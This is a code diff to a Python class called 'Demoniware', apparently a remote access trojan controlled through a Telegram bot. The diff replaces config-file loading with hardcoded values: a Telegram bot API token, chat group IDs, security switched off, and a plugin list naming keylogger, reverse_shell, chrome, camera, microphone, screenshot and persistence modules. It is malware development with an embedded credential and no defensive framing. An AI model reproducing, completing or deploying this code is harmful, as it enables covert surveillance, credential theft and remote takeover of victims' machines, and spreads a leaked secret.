@@ -1,4 +1,3 @@
-import configparser
 from datetime import datetime
 import tempfile
 import textwrap
@@ -36,15 +35,13 @@ class Demoniware(object):
 
         self.logger.info('Demoniware is rising...')
 
-        self.config = configparser.ConfigParser()
-        self.config.read(config_file) 
 
-        self.api_key = api_key if api_key else self.config['Demoniware'].get('api_key', '')
-        self.allowed_groups = allowed_groups if allowed_groups else [int(x) for x in self.config['Demoniware'].get('allowed_groups', []).split(',')]
-        self.max_message_length = self.config['Telegram'].getint('max_message_length', 4096)
-        self.socket_buffer_size = self.config['Socket'].getint('buffer_size', 1024)
+        self.api_key = api_key if api_key else '272769645:AAHaAlus1Bh4xMAJD7crcEwRpe7JxHpy6I0'
+        self.allowed_groups = allowed_groups if allowed_groups else [-167279752,-155034552]
+        self.max_message_length = 4096
+        self.socket_buffer_size = 1024
 
-        self.secure = self.config['Demoniware'].getboolean('secure', False)
+        self.secure = False
 
         self.bot = telepot.Bot(self.api_key)
         self.platform = sys.platform
@@ -56,7 +53,7 @@ class Demoniware(object):
 
         self.node = '{}__{}'.format(platform.node(), uuid.getnode())
 
-        self.plugin_list = [x.strip() for x in self.config['Demoniware'].get('plugins', []).split(',')]
+        self.plugin_list = ['camera', 'chrome', 'download_upload', 'keylogger', 'microphone', 'persistence', 'proc', 'reverse_shell', 'screenshot', 'suicide', 'system']
 
         self.plugins = {}
 
